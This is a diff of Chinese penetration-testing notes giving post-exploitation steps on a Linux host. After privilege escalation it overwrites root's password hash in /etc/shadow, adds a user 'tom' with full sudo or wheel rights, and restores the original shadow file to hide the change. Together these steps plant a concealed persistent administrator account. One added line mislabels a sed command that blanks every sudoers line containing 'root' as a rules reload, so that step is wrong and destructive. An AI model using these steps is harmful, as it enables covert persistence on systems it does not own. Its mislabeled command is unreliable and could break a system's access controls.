@@ -32,14 +32,17 @@ run/exploit
 linux提权成功修改root密码,添加用户,还原root密码
 备份文件:cp /etc/shadow /tmp/shadow.bak
 kali插件生成root密码:mkpasswd -m sha-512 123456
-修改密码:edit /etc/shadow (修改root第一个冒号之后 双冒号之前)
+修改密码:edit /etc/shadow (修改root第一个冒号之后 对应格式之前)
 用Xshell连接服务器
 	添加管理员组账号:adduser tom
 	设置用户密码:passwd tom
-	将sudoers文件的权限修改成可编辑:chmod -v u+w /etc/sudoers
-	使用vim编辑sudoers文件:vim /etc/sudoers
-	找到   	     root    ALL=(ALL)       ALL
-	下方添加一行  tom     ALL=(ALL)      ALL
-	将sudoers文件的权限修改成不可编辑:chmod -v u-w /etc/sudoers
-	把tom添加到root组:usermod -aG root tom
+
+	Centos系统:
+		将用户添加到wheel组: usermod -aG wheel tom
+		将sudoers文件的权限修改成可编辑: chmod -v u+w /etc/sudoers
+		编辑sudoers文件: vim /etc/sudoers
+		确保这一行存在且没有被注释: %wheel  ALL=(ALL)       ALL
+		将sudoers文件的权限修改成不可编辑: chmod -v u-w /etc/sudoers
+		重新加载sudoers规则: sudo sed -i 's/^.*root.*//' /etc/sudoers
+	
 还原文件:cp /tmp/shadow.bak /etc/shadow
